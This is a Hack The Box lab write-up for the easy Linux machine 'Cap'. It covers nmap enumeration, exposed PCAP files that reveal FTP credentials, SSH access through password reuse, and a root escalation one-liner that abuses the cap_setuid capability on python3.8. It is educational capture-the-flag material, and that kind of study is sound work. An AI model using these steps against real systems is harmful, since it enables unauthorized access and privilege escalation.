# Cap — Hack The Box

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)

## Machine Information

| Field | Details |
|---|---|
| Machine | Cap |
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Easy |
| Points | 20 |
| XP Earned | 450 |
| User | nathan |
| Status | Pwned |

## Achievement

[View Hack The Box Achievement](https://labs.hackthebox.com/achievement/machine/4058304/351)

## Enumeration

Started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

### Open Ports

| Port | Service |
|---|---|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

## Web Enumeration

Visited the web application on port 80 and explored its Security Snapshot functionality.

After running a Security Snapshot, the application redirected to:

```text
/data/<SCAN_ID>
```

The application exposed other users' scan results.

## PCAP Analysis

Accessed the PCAP file with ID `0`.

Analyzed the captured network traffic using Wireshark.

Display filter:

```text
ftp
```

The FTP traffic exposed sensitive authentication information, including Nathan's credentials.

## Initial Access — SSH

The recovered FTP password was also valid for SSH.

```bash
ssh nathan@<TARGET_IP>
```

Successfully authenticated as `nathan`.

### User Flag

```bash
cat /home/nathan/user.txt
```

**User Flag:** `REDACTED`

## Privilege Escalation

Enumerated Linux capabilities to identify potentially misconfigured binaries.

```bash
getcap -r / 2>/dev/null
```

Found the following binary:

```text
/usr/bin/python3.8
```

The Python binary had the `cap_setuid` capability, which allowed privilege escalation to root.

### Root Access

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verified privileges:

```bash
id
```

Successfully obtained root access.

### Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `REDACTED`

## Vulnerabilities Identified

- Insecure access to other users' PCAP files.
- FTP cleartext credential exposure.
- Password reuse across services.
- Misconfigured Linux capabilities.

## Key Learnings

- Nmap enumeration.
- Web application enumeration.
- PCAP analysis with Wireshark.
- FTP credential discovery.
- SSH authentication.
- Linux capabilities enumeration.
- Privilege escalation through `cap_setuid`.

## Conclusion

Cap demonstrates how insecure network data handling, exposed credentials, password reuse, and misconfigured Linux capabilities can lead to complete system compromise.

**Result: Machine Successfully Pwned.**
